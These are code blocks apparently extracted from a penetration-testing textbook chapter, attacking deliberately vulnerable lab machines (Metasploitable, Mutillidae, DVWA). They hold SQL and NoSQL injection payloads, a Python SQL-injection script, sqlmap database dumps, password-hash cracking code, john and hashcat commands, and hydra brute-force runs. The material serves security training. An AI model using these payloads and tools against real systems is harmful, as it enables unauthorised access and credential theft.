["```\nSELECT firstname, lastname FROM Users WHERE SSN = '555-55-5555';\n```", "```\nSELECT firstname, lastname FROM Users WHERE SSN = '$id';\n```", "```\n'UNION SELECT username, password FROM Users WHERE '1' = '1\n```", "```\nSELECT firstname, lastname FROM Users WHERE SSN = ''\nUNION\nSELECT username, password FROM Users WHERE '1' = '1';\n```", "```\nmsfadmin@metasploitable:~$ sudo vim /var/www/mutillidae/config.inc\n\n<?php\n\n         ...\n\n         $dbhost = 'localhost';\n\n         $dbuser = 'root';\n\n         $dbpass = '';\n\n      ➊ $dbname = 'owasp10';\n\n?>\n```", "```\nhttp://<web-app-url.com>/ wp-config.php\nhttp://<web-app-url.com>/ config.in\nhttp://<web-app-url.com>/ config.php\n```", "```\nkali@kali:~$ dirb http://<METASPLOITABLE-IP>/mutillidae\n\n-----------------\nDIRB v2.22\nBy The Dark Raver\n\n--snip--\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://192.168.1.112/mutillidae/ ----\n\n ==> DIRECTORY: http://192.168.1.112/mutillidae/classes/\n\n+ http://192.168.1.112/mutillidae/credits (CODE:200|SIZE:509)\n```", "```\nError executing query: Table 'owasp10.users' doesn't exist\n```", "```\n' UNION SELECT * FROM accounts where '' ='\n\nUsername=kevin\nPassword=42\nSignature=Doug Adams rocks\n\nUsername=dave\nPassword=set Signature=Bet\non S.E.T. FTW\n```", "```\n➊ GET /mutillidae/index.php?page=user-info.php&➋ username=test&password=abcd&...\n\n   Host: 192.168.1.101\n\n   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox\n\n\t\t\t /68.0\n\n   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\n   Accept-Language: en-US,en;q=0.5\n\n   Accept-Encoding: gzip, deflate\n\n   Referer: http://192.168.1.101/mutillidae/index.php?page=user-info.php.....\n\n   Connection: keep-alive\n\n➌ Cookie: PHPSESSID=3e726056cf963b43bd87036e378d07be\n\n   Upgrade-Insecure-Requests: 1\n➍\n```", "```\n<form action=\"./index.php?page=user-info.php\"\n\n      method=\"GET\"\n\n      enctype=\"application/x-www-form-urlencoded\" >\n```", "```\nimport socket\nimport argparse\nimport urllib.parse\n\ndef get_request(HOST, URL, parameter, SQL_injection, COOKIE):\n\n    injection_encoded = urllib.parse.quote_plus(SQL_injection)\n\n ➊ request = (\"GET \"+ URL.replace(parameter+\"=\",parameter+\"=\"\n\n\t\t\t +injection_encoded) +\"\\r\\n\"\n\n                \"Host: \"+HOST+\"\\r\\n\"\n\n                \"User-Agent: Mozilla/5.0 \\r\\n\"\n\n                \"Accept: text/html,application/xhtml+xml,application/xml \\r\\n\"\n\n                \"Accept-Language: en-US,en;q=0.5 \\r\\n\"\n\n                \"Connection: keep-alive \\r\\n\"\n\n                \"Cookie: \"+COOKIE+\" \\r\\n\")\n\n    return request\n\ndef main():\n\n ➋ parser = argparse.ArgumentParser()\n\n    parser.add_argument('--host', help='IP-address of server')\n\n    parser.add_argument('-u', help='URL')\n\n    parser.add_argument('--param', help='Query String Parameter')\n\n    parser.add_argument('--cookie', help='Session Cookie')\n\n    args = parser.parse_args()\n\n    HOST = args.host\n\n    URL = args.u\n\n    PARAMETER = args.param\n\n    COOKIE = args.cookie\n\n    SQL_injection = '\\'UNION SELECT * FROM accounts where \\'1\\'=\\'1'\n\n    PORT = 80\n\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:\n\n        tcp_socket.connect((HOST, PORT))\n\n        request = get_request(HOST, URL, PARAMETER, SQL_injection, COOKIE)\n\n        print(request)\n\n     ➌ tcp_socket.sendall(request.encode())\n\n        while True:\n\n            data = tcp_socket.recv(1024)\n\n            print(data)\n\n            if not data:\n\n                break\n\nmain()\n```", "```\nkali@kali:~/Desktop/injection$ sudo python3 sql_injection.py --host=\"\n\n\t\t\t 192.168.1.112\" -u=\"/mutillidae/index.php?page=user-info.php&username=&\n\n\t\t\t password=&user-info-php-submit-button=View+Account+Details\" --param=\"\n\n\t\t\t password\" --cookie=\"PHPSESSID=3e726056cf963b43bd87036e378d07b\"\nGET /mutillidae/index.php?page=user-info.php&username=&password=+%27UNION+\n\n\t\t\t SELECT+%2A+FROM+accounts+where+%271%27%3D%271&user-info-php-submit-\n\n\t\t\t button=View+Account+Details\nHost: 192.168.1.112\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml\nAccept-Language: en-US,en;q=0.5\nConnection: keep-alive\nCookie: PHPSESSID=3e726056cf963b43bd87036e378d07b\n\n...\n\n16 records found.<p><b>Username=</b>admin<br><b>Password=</b>adminpass<br><b>\n\n\t\t\t Signature=</b>Monkey!<br><p><b>Usern'\nb'ame=</b>adrian<br><b>Password=</b>somepassword<br><b>Signature=</b>Zombie\n\n\t\t\t Films Rock!<br><p><b>Username=</b>john<br><b>Password=</b>monkey<br><b\n\n\t\t\t >Signature=</b>I like the smell of confunk<br><p><b>Username=</b>\n\n\t\t\t jeremy<br><b>Password=</b>password<br><b>Signature=</b>d1373 1337\n\n\t\t\t![image](../images/arrow01.jpg)\n\t\t\t speak\n```", "```\nkali@kali:~$ sqlmap -u \"http://<Metasploitable-IP>/mutillidae/index.php?page=\n\n\t\t\t user-info.php&username=&password=&\" --sqlmap-shell\n\nsqlmap-shell>\n```", "```\n   sqlmap-shell> --dbs\n\n   [16:16:04] [INFO] testing connection to the target URL\n➊ you have not declared cookie(s), while server wants to set its own ('PHPSESSID\n\n\t\t\t =724251ceeec...19e0ca7aeb'). Do you want to use those [Y/n] :Y\n\n   ...\n\n   Parameter: username (GET)\n\n       Type: boolean-based blind\n\n       Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL\n\n\t\t\t comment)\n\n    ➋ Payload: page=user-info.php&username='OR NOT 6675=6675#&password=&user-\n\n\t\t\t info-php-submit-button=View Account Details\n\n   ...\n\n   [16:16:06] [INFO] fetching database names\n➌ available databases [7]:\n\n   [*] dvwa\n\n   [*] information_schema\n\n   [*] metasploit\n\n   [*] mysql\n➍ [*] owasp10\n\n   [*] tikiwiki\n\n   [*] tikiwiki195\n```", "```\nsqlmap-shell> -D owasp10 --tables\n\n[17:02:24] [INFO] fetching tables for database: 'owasp10'\nDatabase: owasp10\n\n[6 tables]\n\n+----------------+\n\n| accounts       |\n\n| blogs_table    |\n\n| captured_data  |\n\n| credit_cards   |\n\n| hitlog         |\n\n| pen_test_tools |\n\n+----------------+\n```", "```\nsqlmap-shell>-D owasp10 -T accounts --dump\n\nTable: accounts\n\n[16 entries]\n\n+-----+----------+----------+--------------+-----------------------------+\n\n| cid | is_admin | username | password     | mysignature                 |\n\n+-----+----------+----------+--------------+-----------------------------+\n\n...\n\n| 11  | FALSE    | scotty   | password     | Scotty Do                   |\n\n| 12  | FALSE    | cal      | password     | Go Wildcats                 |\n\n| 13  | FALSE    | john     | password     | Do the Duggie!              |\n\n| 14  | FALSE    | kevin    | 42           | Doug Adams rocks            |\n\n| 15  | FALSE    | dave     | set          | Bet on SET FTW              |\n\n| 16  | FALSE    | ed       | pentest      | Commandline KungFu anyone?  |\n\n+-----+----------+----------+--------------+-----------------------------+\n```", "```\nsqlmap-shell> -D dvwa -T users -C user,password --dump\n\ndo you want to store hashes to a temporary file for eventual further\n\n\t\t\t processing with other tools [y/N] y\ndo you want to crack them via a dictionary-based attack? [Y/n/q] Y\n\n[18:08:22] [INFO] using hash method 'md5_generic_passwd'\n\nDatabase: dvwa\nTable: users\n\n[5 entries]\n\n+---------+---------------------------------------------+\n\n| user    | password                                    |\n\n+---------+---------------------------------------------+\n\n| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |\n\n| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |\n\n| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |\n\n| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |\n\n| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |\n\n+---------+---------------------------------------------+\n```", "```\nkali@kali:~/Desktop$ git clone https://github.com/danielmiessler/SecLists\n```", "```\nimport hashlib\n\ndef crack_MD5_Hash(hash_to_crack, salt, dictionary_file):\n\n    file = open(dictionary_file, \"r\")\n\n ➊ for password in file:\n\n        salted_password = (salt + password.strip(\"\\n\")).encode('UTF-8')\n\n        if hashlib.md5(salted_password).hexdigest() == hash_to_crack:\n\n         ➋ return password\n\n    return None\n\n➌ hash_to_crack = 'c94201dbba5cb49dc3a6876a04f15f75'\n\n   salt = 'd6a6bc0db10694a2d90e3a69648f3a03'\n\n   dict = \"/home/kali/Desktop/SecLists/Passwords/darkweb2017-top10000.txt\"\n\n   password = crack_MD5_Hash(hash_to_crack, salt, dict)\n\n   print(password)\n```", "```\nkali@kali:~/Desktop/HashCrack$ python3 myHashCracker.py\ntrustno1\n```", "```\nkali@kali:~/Desktop/HashCrack$ echo 8\n\n\t\t\t![image](../images/arrow01.jpg) afcd5cc09a539fe6811e43ec75722de24d85840d2c03333d3e489f56e6aa60f > hashes.txt\n```", "```\nkali@kali:~/Desktop/HashCrack$ sudo john --format=raw-sha256 --wordlist=\"/home/kali/Desktop/\n\n\t\t\t SecLists/Passwords/Leaked-Databases/000webhost.txt\" hashes.txt\nUsing default input encoding: UTF-8\n```", "```\nkali@kali:~/Desktop/HashCrack$ sudo john --format=raw-sha256 --show hashes.txt\n\n?:trustno1\n\n1 password hash cracked, 0 left\n```", "```\nhashcat -a 0 -m 1400 hashes.txt ~/Desktop/SecLists/Passwords/darkweb2017-top10000.txt\n```", "```\nkali@kali$hashcat --help\n\n  # | Mode\n\n ===+======\n\n  0 | Straight\n\n  1 | Combination\n\n  3 | Brute-force\n\n  6 | Hybrid Wordlist + Mask\n\n  7 | Hybrid Mask + Wordlist\n```", "```\n       # | Name                      | Category\n\n   ======+===========================+====================================\n\n       0 | MD5                       | Raw Hash\n\n ➊ 1400 | SHA2-256                  | Raw Hash\n\n      10 | md5($pass.$salt)          | Raw Hash, Salted and/or Iterated\n\n ➋ 1420 | sha256($salt.$pass)       | Raw Hash, Salted and/or Iterated\n```", "```\nanonymous:anonymous\nroot:rootpasswd\nroot:12hrs37\nftp:b1uRR3\nadmin:admin\nlocaladmin:localadmin\nadmin:1234\n```", "```\nkali@kali:~/Desktop/HashCrack$ hydra -C ~/Desktop/SecLists/Passwords/Default-\n Credentials/ftp-betterdefaultpasslist.txt 192.168.1.101 ftp\n\n[21][ftp] host: 192.168.1.101   login: ftp         password: b1uRR3\n\n[21][ftp] host: 192.168.1.101   login: anonymous   password: anonymous\n\n[21][ftp] host: 192.168.1.101   login: ftp         password: ftp\n```", "```\n   import pymongo\n\n➊ db_client = pymongo.MongoClient(\"mongodb://localhost:27017/\")\n➋ databases = db_client[\"company_database\"]\n\n➌ def getUserInfo(post_ssn):\n\n       collection = databases[\"customers\"]\n\n    ➍ query = { \"SSN\": \"+post_ssn+\" }\n\n       doc = collection.find(query)\n\n       return doc\n```", "```\n{\"SSN\": {$ne:\"\"}}\n```", "```\nkali@kali:~$hydra -l <USERNAME> -P ~/Desktop/SecLists/Passwords/darkweb2017-\n\n\t\t\t top100.txt 192.168.1.101 http-get-form \"/mutillidae/index.php?page=\n\n\t\t\t user-info.php&:username=^USER^&password=^PASS^&: Error: Bad user name\n\n\t\t\t or password\"\n```"]